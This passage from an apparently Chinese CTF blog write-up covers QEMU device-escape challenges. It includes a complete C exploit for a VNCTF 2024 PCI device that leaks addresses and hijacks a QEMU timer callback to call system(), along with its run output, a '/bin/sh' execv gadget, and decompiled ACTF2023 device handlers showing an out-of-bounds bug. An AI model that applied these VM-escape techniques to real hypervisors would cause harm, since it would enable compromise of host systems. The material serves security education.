class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;complex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, <span class="string">&quot;[*] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, COLOR_GREEN <span class="string">&quot;[+] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,     \</span></span><br><span class="line"><span class="meta">          ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, COLOR_RED <span class="string">&quot;[-] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fatal(fmt, ...)                                                        \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    EMSG(fmt, ##__VA_ARGS__);                                                  \</span></span><br><span class="line"><span class="meta">    exit(EXIT_FAILURE);                                                        \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;=============\tDEBUG\t=========&quot;</span>);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">mmio_readl</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title">mmio_readll</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> high = <span class="built_in">mmio_readl</span>(addr + <span class="number">4</span>);</span><br><span class="line">  <span class="type">uint64_t</span> low = <span class="built_in">mmio_readl</span>(addr);</span><br><span class="line">  <span class="keyword">return</span> (high &lt;&lt; <span class="number">32</span>) | (low &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_writel</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_writell</span><span class="params">(<span class="type">uint64_t</span> off, <span class="type">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> high, low;</span><br><span class="line">  low = (off &lt;&lt; <span class="number">32</span>) | (value &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(mmio_mem + <span class="number">0x20</span>) = low;</span><br><span class="line">  high = ((off + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>) | (value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(mmio_mem + <span class="number">0x20</span>) = high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">set_off</span><span class="params">(<span class="type">int32_t</span> off)</span> </span>&#123; <span class="built_in">mmio_writel</span>(<span class="number">0x10</span>, off); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmio_setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> fd =</span><br><span class="line">      <span class="built_in">open</span>(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error open resource0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mmio_mem = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error mmap fd&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> elf_base;</span><br><span class="line">  <span class="type">uint64_t</span> vn_mmio_ops;</span><br><span class="line">  <span class="type">uint64_t</span> main_loop_tlg;</span><br><span class="line">  <span class="type">uint64_t</span> qemu_time_list1;</span><br><span class="line">  <span class="type">uint64_t</span> opaque;</span><br><span class="line">  <span class="type">uint64_t</span> opaque_buf;</span><br><span class="line">  <span class="type">uint64_t</span> system_fptr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Prepare mmio...&quot;</span>);</span><br><span class="line">  <span class="built_in">mmio_setup</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leaking elf base...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(<span class="number">-0xC0</span>);</span><br><span class="line">  vn_mmio_ops = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  elf_base = vn_mmio_ops - <span class="number">0xf581e0</span>;</span><br><span class="line">  main_loop_tlg = elf_base + <span class="number">0x14b9480</span>;</span><br><span class="line">  system_fptr = elf_base + <span class="number">0x312040</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;elf_base : %#lx&quot;</span>, elf_base);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;main_loop_tlg : %#lx&quot;</span>, main_loop_tlg);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;system func : %#lx&quot;</span>, system_fptr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leaking opaque addr...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(<span class="number">-0xC0</span> + <span class="number">8</span>);</span><br><span class="line">  opaque = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  opaque_buf = opaque + <span class="number">0xb40</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;opaque : %#lx&quot;</span>, opaque);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;opaque_buf : %#lx&quot;</span>, opaque_buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leak QemuTimerListGroup[1]...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(main_loop_tlg - opaque_buf + <span class="number">0x8</span>);</span><br><span class="line">  qemu_time_list1 = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;qemu_time_list1 : %#lx&quot;</span>, qemu_time_list1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Make fake QEMUTimer in opaque buf....&quot;</span>);</span><br><span class="line">  <span class="comment">// struct QEMUTimerListGroup &#123;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerList *tl[QEMU_CLOCK_MAX];</span></span><br><span class="line">  <span class="comment">// &#125;;</span></span><br><span class="line">  <span class="comment">// struct QEMUTimerList &#123;</span></span><br><span class="line">  <span class="comment">//   QEMUClock *clock;</span></span><br><span class="line">  <span class="comment">//   QemuMutex active_timers_lock;</span></span><br><span class="line">  <span class="comment">//   QEMUTimer *active_timers;        // 0x48 : change to opaque_buf</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// struct QEMUTimer &#123;</span></span><br><span class="line">  <span class="comment">//   int64_t expire_time;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerList *timer_list;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerCB *cb;                  // 0x10: change to system func ptr</span></span><br><span class="line">  <span class="comment">//   void *opaque;                     // 0x18: change to cmd</span></span><br><span class="line">  <span class="comment">//   QEMUTimer *next;</span></span><br><span class="line">  <span class="comment">//   int attributes;</span></span><br><span class="line">  <span class="comment">//   int scale;</span></span><br><span class="line">  <span class="comment">// &#125;;</span></span><br><span class="line">  <span class="type">uint64_t</span> fake_qemu_timer = opaque_buf;</span><br><span class="line">  <span class="type">uint64_t</span> cmd_ptr = opaque_buf + <span class="number">0x30</span>;</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x8</span>, qemu_time_list1);</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x10</span>, system_fptr);</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x18</span>, cmd_ptr);</span><br><span class="line">  <span class="comment">// &quot;/bin/sh&quot; 0x0068732f6e69622f </span></span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x30</span>, <span class="number">0x67616c6620746163</span>); <span class="comment">// &quot;cat flag&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Change QemuTimerListGroup[1] to opaque buf&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(qemu_time_list1 - fake_qemu_timer + <span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">mmio_writel</span>(<span class="number">0x30</span>, fake_qemu_timer);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># ./exp</span></span><br><span class="line">[+] exp.c       Prepare mmio...</span><br><span class="line">[+] exp.c       Leaking elf base...</span><br><span class="line">[*] exp.c       elf_base : 0x55e4c481e000</span><br><span class="line">[*] exp.c       main_loop_tlg : 0x55e4c5cd7480</span><br><span class="line">[*] exp.c       system func : 0x55e4c4b30040</span><br><span class="line">[+] exp.c       Leaking opaque addr...</span><br><span class="line">[*] exp.c       opaque : 0x55e4c89d3c30</span><br><span class="line">[*] exp.c       opaque_buf : 0x55e4c89d4770</span><br><span class="line">[+] exp.c       Leak QemuTimerListGroup[1]...</span><br><span class="line">[*] exp.c       qemu_time_list1 : 0x55e4c79f5840</span><br><span class="line">[+] exp.c       Make fake QEMUTimer <span class="keyword">in</span> opaque buf....</span><br><span class="line">flag&#123;vnctf2024-test&#125;</span><br></pre></td></tr></table></figure><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit 2"></a>Exploit 2</h3><p>net_bridge_run_helperexecv(&#x2F;bin&#x2F;sh)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000674291</span>                 lea     rax, [rbp+argv]</span><br><span class="line">.text:<span class="number">0000000000674298</span>                 mov     rsi, rax        ; argv</span><br><span class="line">.text:<span class="number">000000000067429B</span>                 lea     rax, aBinSh_0   ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">00000000006742</span>A2                 mov     rdi, rax        ; path</span><br><span class="line">.text:<span class="number">00000000006742</span>A5                 call    _execv</span><br></pre></td></tr></table></figure><p>MemoryRegionops MMIO read&#x2F;write<code>ops-&gt;read()</code>  <code>ops-&gt;write()</code></p><h2 id="ACTF2023-qemu-playground"><a href="#ACTF2023-qemu-playground" class="headerlink" title="ACTF2023 qemu playground"></a>ACTF2023 qemu playground</h2><p><a href="https://hanqi-blogs.cn/2023/ACTF-2023%20QemuPlayground/">(3)</a> &amp;&amp; PWN</p><p><a href="https://github.com/team-s2/ACTF-2023">team-s2&#x2F;ACTF-2023</a></p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 ./qemu-system-x86_64 \</span><br><span class="line">    -device actf \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -L ./pc-bios \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0&quot;</span> \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null</span><br></pre></td></tr></table></figure><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>IDA<strong>actf</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">000000000098B</span>9FB<span class="number">0000000</span>ACactf-mmio</span><br><span class="line">.rodata:<span class="number">000000000098B</span>A05<span class="number">0000000</span>ACactf-pmio</span><br></pre></td></tr></table></figure><p> realize </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">actf_class_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ***objectClass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *devClass; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *pciDevClass; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  devClass = (<span class="type">void</span> *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                       objectClass,</span><br><span class="line">                       <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/home/esifiel/qemu/include/hw/qdev-core.h&quot;</span>,</span><br><span class="line">                       <span class="number">0x4D</span>u,</span><br><span class="line">                       <span class="string">&quot;DEVICE_CLASS&quot;</span>);</span><br><span class="line">  pciDevClass = (<span class="type">void</span> *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                          objectClass,</span><br><span class="line">                          <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                          <span class="string">&quot;/home/esifiel/qemu/include/hw/pci/pci_device.h&quot;</span>,</span><br><span class="line">                          <span class="number">9u</span>,</span><br><span class="line">                          <span class="string">&quot;PCI_DEVICE_CLASS&quot;</span>);</span><br><span class="line">  *((_QWORD *)pciDevClass + <span class="number">22</span>) = pci_actf_realize;</span><br><span class="line">  *((_DWORD *)pciDevClass + <span class="number">52</span>) = <span class="number">0xAC7F1234</span>;   <span class="comment">// classid:vendorid</span></span><br><span class="line">  *((_BYTE *)pciDevClass + <span class="number">212</span>) = <span class="number">0x10</span>;         <span class="comment">// reversion</span></span><br><span class="line">  *((_WORD *)pciDevClass + <span class="number">107</span>) = <span class="number">0xFF</span>;         <span class="comment">// class id</span></span><br><span class="line">  *((_QWORD *)devClass + <span class="number">12</span>) |= <span class="number">0x80</span>uLL;</span><br><span class="line">  <span class="keyword">return</span> pciDevClass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">pci_actf_realize</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****actfState; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// r13</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  actfState = <span class="built_in">object_dynamic_cast_assert</span>(object, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  v2 = (__int64)(actfState + <span class="number">336</span>);</span><br><span class="line">  v3 = (__int64)actfState;</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(</span><br><span class="line">    (__int64)(actfState + <span class="number">336</span>),</span><br><span class="line">    (__int64)actfState,</span><br><span class="line">    &amp;mmio_ops,</span><br><span class="line">    (__int64)actfState,</span><br><span class="line">    (__int64)<span class="string">&quot;actf-mmio&quot;</span>,</span><br><span class="line">    <span class="number">4096LL</span>);</span><br><span class="line">  <span class="built_in">pci_register_bar</span>((__int64)object, <span class="number">0</span>, <span class="number">0</span>, v2);</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(v3 + <span class="number">2960</span>, v3, &amp;pmio_ops, v3, (__int64)<span class="string">&quot;actf-pmio&quot;</span>, <span class="number">32LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">pci_register_bar</span>((__int64)object, <span class="number">1</span>, <span class="number">1u</span>, v3 + <span class="number">2960</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mmio_read&#x2F;writerdivoidPCIDevicebuffer4</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">actf_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)(opaque + addr + <span class="number">0xA38</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">actf_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> val, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">        *(_DWORD *)(opaque + addr + <span class="number">0xA38</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + addr + <span class="number">0xA38</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pmio_read&#x2F;writewrite xxxx</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">actf_pmio_read</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque, <span class="type">unsigned</span> __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> __int8 *)v2 + <span class="number">0xA31</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> __int8 *)v2 + <span class="number">0xA30</span>);</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr - <span class="number">16</span> &gt; <span class="number">0xF</span> || !*((_BYTE *)v2 + <span class="number">0xA31</span>) )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)v2[<span class="number">335</span>] + (addr &amp; <span class="number">0xF</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">actf_pmio_write</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  <span class="built_in">off_11BB7F0</span>(v4 + <span class="number">405</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">116LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)v4 + <span class="number">0xA30</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v4 + <span class="number">2608</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">qemu_thread_create</span>((<span class="type">pthread_t</span> *)v4 + <span class="number">404</span>, (__int64)<span class="string">&quot;actf-worker-thread&quot;</span>, (__int64)sub_409F40, (__int64)v4, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">1</span> )</span><br><span class="line">  